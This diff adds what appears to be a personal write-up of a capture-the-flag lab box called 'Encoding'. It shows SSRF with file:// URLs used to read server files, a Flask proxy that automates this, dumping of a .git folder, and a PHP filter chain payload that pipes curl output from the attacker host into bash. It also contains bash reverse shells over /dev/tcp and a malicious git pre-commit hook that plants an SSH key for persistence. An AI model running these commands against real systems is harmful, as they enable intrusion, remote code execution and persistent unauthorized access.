@@ -1,0 +1,284 @@
+nmap -sV -sC -vv -oA nmap/encoding 
+
+use nuclei -target http://10.129.196.240
+
+doing serverside request forgery
+
+In the api tab, its saying that we can use 
+
+http://api.haxtables.htb/v3/tools/string/index.php' to make a post request,
+
+lets go to the url and pass it over to burpsuite
+
+when trying to visit the url, we get not enough data and thats becauase we need to convert the request to post and add the json data
+
+json_data = {
+        'action': 'str2hex',
+        'data': 'kavigihan',
+    }
+
+in the burpsuite we also need to remember to change the x-www-form-urlencoded which is in the content type to json and change the single quotes to double quotes
+
+where it says data, there is a file_url paramater where we can pass in our url by creating a test file and creating a netcat listener server and seeing if we can get a hit from it
+
+we do get a resonse back, but nothing is being exposed
+
+we can also try other paramater besides the "http"
+
+we can do file://etc/passwd
+
+we can also try file:///etc/passwd
+
+we get data back, 
+
+now we cant to create a middleware that can automate this 
+
+use flask to make a simple web server
+
+
+from flask import Flask
+import requests
+import json
+
+app = Flask(__name__)
+
+@app.route('/<path:path>')
+def index(path):
+    json_data = {
+        "action": "str2hex",
+        "file_url": "file:///" + path
+    }
+    r = requests.post('http://api.haxtables.htb/v3/tools/string/index.php',
+        json=json_data)
+
+    page = json.loads(r.text.strip())
+    res = bytes.fromhex(page["data"])
+    return res
+
+if __name__ == '__main__':
+    app.run()
+
+
+use python3 to run the app.py 
+
+in a seperate terminal, run curl localhost:port/etc/passwd and we get the results of /etc/passwd
+
+we can look for the apache2 sites-enabled default conf using 
+
+curl localhost:5000/etc/apache2/sites-enabled/000-default.conf
+
+look for what .htaccess we have 
+
+curl localhost:5000/var/www/image/.htaccess
+
+curl localhost:5000/var/www/image/index.php
+
+curl localhost:5000/var/www/image/utils.php
+
+using gobuster to find other dir on box
+
+gobuster dir -u http://localhost:5000/var/www/image/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
+
+we are going to update the code 
+
+from flask import Flask, make_response
+import requests
+import json
+
+app = Flask(__name__)
+
+@app.route('/<path:path>')
+def index(path):
+    json_data = {
+        "action": "str2hex",
+        "file_url": "file:///" + path
+    }
+    r = requests.post('http://api.haxtables.htb/v3/tools/string/index.php',
+        json=json_data)
+
+    page = json.loads(r.text.strip())
+    page_data = bytes.fromhex(page["data"])
+    response = make_response(page_data)
+    if len(page_data) == 0:
+        response.status_code = 404
+    return response
+
+if __name__ == '__main__':
+    app.run()
+
+
+changed the gobuster to 
+
+gobuster dir -u http://localhost:5000/var/www/image/ -w /opt/SecLists/Discovery/Web-Content/common.txt  -x php
+
+
+after running gobuster, 
+
+we found that there was a a .git folder 
+
+and we are now going to run git-dumper 
+
+we created a src folder 
+
+
+now running git-dumper
+
+git-dumper  http://localhost:5000/var/www/image/ src/
+
+
+we needed to change the code to 
+
+from flask import Flask, make_response
+import requests
+import json
+
+app = Flask(__name__)
+
+@app.route('/<path:path>')
+def index(path):
+    json_data = {
+        "action": "str2hex",
+        "file_url": "file:///" + path
+    }
+    r = requests.post('http://api.haxtables.htb/v3/tools/string/index.php',
+        json=json_data)
+
+    page = json.loads(r.text.strip())
+    page_data = bytes.fromhex(page["data"])
+    response = make_response(page_data)
+    if len(page_data) == 0:
+        response.status_code = 404
+    response.headers['Content-Type'] = 'text/plain'
+    return response
+
+if __name__ == '__main__':
+    app.run()
+
+
+restart the server 
+
+rerun the git dumper command
+
+git-dumper  http://localhost:5000/var/www/image/ src/
+
+after the git-dumper is finished, we open in code
+
+use synk to find vulnerabilities in the code
+
+in burpsuite we want to change the file url to be 'http://image.haxtables.htb/actions/action_handler.php?page=/etc/passwd'
+
+we get access blocked,
+
+so we have to create a php interpreter 
+
+open a terminal
+php -a
+
+gethostbyname("test")
+we get 127.0.0.1
+
+if we do instead 
+
+echo parse_url("http://parrot", PHP_URL_HOST");
+we get parrot,
+
+but if we remove the "http:",
+
+echo parse_url("parrot", PHP_URL_HOST");
+
+we get nothing back, but it means the same thing, so we can remove the http in line 168 
+
+and it will work
+
+There is a php gadget chain and filter 
+
+git clone https://github.com/synacktiv/php_filter_chain_generator.git
+
+so we start with 
+
+python3 php_filter_chain_generator.py --chain "<?php system('curl 10.10.16.23|bash'); ?>"
+
+we can grep for lines starting with php: 
+
+python3 php_filter_chain_generator.py --chain "<?php system('curl 10.10.16.23|bash'); ?>" | grep ^php:
+
+next we put it to our clipboard using 
+
+python3 php_filter_chain_generator.py --chain "<?php system('curl 10.10.16.23|bash'); ?>" | grep ^php: | xclip -selection clipboard
+
+replace the "/etc/passwd" in burpsuite
+
+start a netcat
+
+sudo nc-lvnp 80
+
+we get a response on the netcat server from curl user agent 
+
+and now we can create a reverseshell 
+
+we create www 
+
+we go into www
+
+we do a vi index.html
+
+bash -c ' bash -i >& /dev/tcp/10.10.16.23/9001 0>&1'
+
+we then create a python server in the www folder
+
+sudo python3 -m http.server 80
+
+then create a netcat listener 
+
+nc -lvnp 9001
+
+python3 -c ;import pty;pty.spawn("/bin/bash")'
+CTRL +Z
+stty raw -echo;fg
+
+do sudo -l
+
+we can do 
+
+(svc) NOPASSWD: /var/www/image/scripts/git-commit.sh
+
+getfacl .git/
+
+find . -writable
+
+cd .git 
+
+cd hooks
+
+cp pre-commit.sample pre-commit
+
+vi pre-commit 
+
+remove everything after the comments
+
+we are going to make sure that the /home/svc/.ssh folder is created if not created already
+
+so add mkdir -p /home/svc/.ssh
+
+
+we are going to do a key gen 
+on local machine 
+
+ssh-keygen -t ed25519 -f svc 
+
+cat the public file
+copy ssh line from the catting the public file 
+
+in the reverse shell 
+
+always add a linebreak before and after the key
+
+#!/bin/sh
+
+bash -c 'bash -i >& /dev/tcp/10.10.16.23/9001 0>&1'
+mkdir -p /home/svc/.ssh/
+add printf "\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICvzumz5LMQl+Y6Y/+id+vQgLFB0Ajjdn+95nDdHbGZdR ryeon@parrot\n" >> /home/svc/.ssh/authorized_keys
+echo "test" > /tmp/pwned
+chmod 600 /home/svc/.ssh/authorized_keys
+
+
